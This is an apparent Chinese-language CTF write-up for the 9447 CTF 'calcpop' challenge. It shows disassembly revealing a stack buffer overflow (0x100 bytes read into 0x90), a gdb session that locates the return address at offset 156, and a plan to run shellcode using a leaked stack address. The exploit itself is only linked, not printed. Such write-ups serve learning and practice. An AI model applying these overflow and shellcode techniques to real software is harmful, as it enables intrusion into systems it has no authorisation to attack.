---
title: 'Writeup-9447 CTF: calcpop'
layout: post
categories: blog
tags: [Hack, CTF, Writeup, Exploitation]
---

先看反汇编代码：
{% highlight objdump %}
...
8048460:	55                   	push   %ebp
8048461:	89 e5                	mov    %esp,%ebp
8048463:	57                   	push   %edi
8048464:	56                   	push   %esi
8048465:	be 00 01 00 00       	mov    $0x100,%esi
804846a:	53                   	push   %ebx
804846b:	83 e4 f0             	and    $0xfffffff0,%esp
804846e:	81 ec 90 00 00 00    	sub    $0x90,%esp
8048474:	a1 60 a0 04 08       	mov    0x804a060,%eax
8048479:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
8048480:	00
8048481:	8d 5c 24 10          	lea    0x10(%esp),%ebx
8048485:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
804848c:	00
804848d:	89 df                	mov    %ebx,%edi
804848f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
8048496:	00
8048497:	89 04 24             	mov    %eax,(%esp)
804849a:	e8 a1 ff ff ff       	call   8048440 <setvbuf@plt>
804849f:	c7 04 24 10 88 04 08 	movl   $0x8048810,(%esp)
80484a6:	e8 55 ff ff ff       	call   8048400 <puts@plt>
80484ab:	eb 29                	jmp    80484d6 <main+0x76>
80484ad:	8d 76 00             	lea    0x0(%esi),%esi
80484b0:	a1 40 a0 04 08       	mov    0x804a040,%eax
80484b5:	89 04 24             	mov    %eax,(%esp)
80484b8:	e8 33 ff ff ff       	call   80483f0 <_IO_getc@plt>
80484bd:	85 c0                	test   %eax,%eax
80484bf:	0f 88 e3 00 00 00    	js     80485a8 <main+0x148>
80484c5:	88 07                	mov    %al,(%edi)
80484c7:	83 ee 01             	sub    $0x1,%esi
80484ca:	83 c7 01             	add    $0x1,%edi
80484cd:	83 f8 0a             	cmp    $0xa,%eax
80484d0:	0f 84 ca 00 00 00    	je     80485a0 <main+0x140>
80484d6:	83 fe 01             	cmp    $0x1,%esi
80484d9:	77 d5                	ja     80484b0 <main+0x50>
80484db:	85 f6                	test   %esi,%esi
80484dd:	0f 85 bd 00 00 00    	jne    80485a0 <main+0x140>
...
{% endhighlight %}

这段代码是 main() 函数起始的位置，可以看到这里的工作是将终端输入的数据循环读入栈中。其中 esi 寄存器是循环计数器，初始值是 0x100, 而在栈中划分的空间只有 0x90 字节, 这里存在栈溢出。

用 `pattern.py 256` 生成 pattern, 开 gdb 调试 calcpop.
{% highlight console%}
$ gdb calcpop
Reading symbols from calcpop...done.
(gdb) r
Starting program: /home/cubelin/is/ctf/9447/pwn/calcpop/calcpop
Welcome to calc.exe
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
Missing a space; your input was 0xffffd390
Missing a space; your input was 0xffffd390
exit
Exiting...

Program received signal SIGSEGV, Segmentation fault.
0x41326641 in ?? ()
(gdb) quit

$ pattern.py 0x41326641
Pattern 0x41326641 first occurrence at position 156 in pattern.
{% endhighlight%}

main() 函数返回地址在 offset 为 156 的位置。然后借由程序返回的栈地址，可以直接执行栈中的 shellcode.

exp 如下:

{% gist cubarco/ee054809d1643602b844 %}
